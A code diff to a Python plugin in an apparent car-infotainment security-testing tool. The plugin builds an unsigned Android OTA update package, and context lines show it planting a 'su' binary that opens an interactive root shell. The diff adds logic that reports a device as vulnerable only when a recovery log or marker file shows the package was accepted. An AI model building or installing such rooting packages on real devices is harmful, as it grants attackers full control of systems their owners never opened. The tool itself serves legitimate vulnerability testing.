@@ -12,10 +12,23 @@ Usage: python3 69_USB_Unsigned_Update.py
 import sys
 import os
 import zipfile
+import time
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class USBUnsignedUpdatePlugin(IVIVulnerabilityPlugin):
+    meta_poc_name = "USB Unsigned Update"
+    meta_cve_id = "N/A"
+    meta_severity = "Medium"
+    meta_protocol = "rf"
+    meta_target_os = ["all"]
+    meta_required_params = []
+    is_disruptive = False
+    meta_destructive_level = "Safe"
+
     def check_prerequisites(self):
+        self.recovery_log_path = self.params.get("recovery_log_path")
+        self.acceptance_marker_path = self.params.get("acceptance_marker_path")
+        self.observe_seconds = float(self.params.get("observe_seconds", 5))
         return True
 
     def exploit(self):
@@ -51,6 +64,23 @@ class USBUnsignedUpdatePlugin(IVIVulnerabilityPlugin):
                     b"exec /system/bin/sh -i\\n"
                 )
                 z.writestr("system/xbin/su", su_payload)
+
+            marker = "AutoSec-Guard Unsigned OTA Test"
+            time.sleep(self.observe_seconds)
+            if self.acceptance_marker_path and os.path.exists(self.acceptance_marker_path):
+                return {
+                    "status": "success",
+                    "vulnerable": True,
+                    "details": f"Target acceptance marker detected at {self.acceptance_marker_path} after unsigned OTA package generation."
+                }
+            if self.recovery_log_path and os.path.exists(self.recovery_log_path):
+                log_data = open(self.recovery_log_path, "r", encoding="utf-8", errors="ignore").read()
+                if marker in log_data:
+                    return {
+                        "status": "success",
+                        "vulnerable": True,
+                        "details": f"Recovery log {self.recovery_log_path} contains unsigned OTA execution marker."
+                    }
                 
             self.logger.warning(f"[SUCCESS] 无签名/弱签名的 Android OTA 升级包已生成！")
             self.logger.warning(f"  绝对路径: {zip_path}")
@@ -60,8 +90,8 @@ class USBUnsignedUpdatePlugin(IVIVulnerabilityPlugin):
             
             return {
                 "status": "success",
-                "vulnerable": True,
-                "details": f"Generated unsigned Android update.zip at {zip_path}."
+                "vulnerable": False,
+                "details": f"已生成无签名 OTA 样本 {zip_path}，但未从 recovery_log_path/acceptance_marker_path 观察到被接受的自动化证据。"
             }
 
         except Exception as e:
@@ -69,8 +99,5 @@ class USBUnsignedUpdatePlugin(IVIVulnerabilityPlugin):
             return {"status": "error", "details": str(e)}
 
 if __name__ == "__main__":
-    if len(sys.argv) < 2:
-        print("Usage: python3 69_USB_Unsigned_Update.py")
-        sys.exit(1)
-    plugin = USBUnsignedUpdatePlugin()
+    plugin = USBUnsignedUpdatePlugin({})
     plugin.run_verify()
